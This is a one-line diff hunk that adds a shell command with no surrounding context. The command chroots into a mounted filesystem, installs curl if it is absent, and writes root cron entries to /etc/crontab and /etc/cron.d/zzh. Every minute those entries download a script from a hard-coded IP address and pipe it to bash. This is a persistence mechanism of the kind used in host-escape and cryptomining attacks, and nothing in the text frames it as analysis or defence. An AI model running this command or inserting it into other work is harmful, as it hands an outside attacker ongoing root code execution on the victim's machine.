@@ -1,0 +1,1 @@
+chroot /mnt/ /bin/sh -c 'if ! type curl >/dev/null;then apt-get install -y curl;apt-get install -y --reinstall curl;yum clean all;yum install -y curl;yum reinstall -y curl;fi;echo "* * * * * root curl http://199.19.226.117/b2f628/cronb.sh|bash">/etc/crontab && echo "* * * * * root curl http://199.19.226.117/b2f628/cronb.sh|bash">/etc/cron.d/zzh'
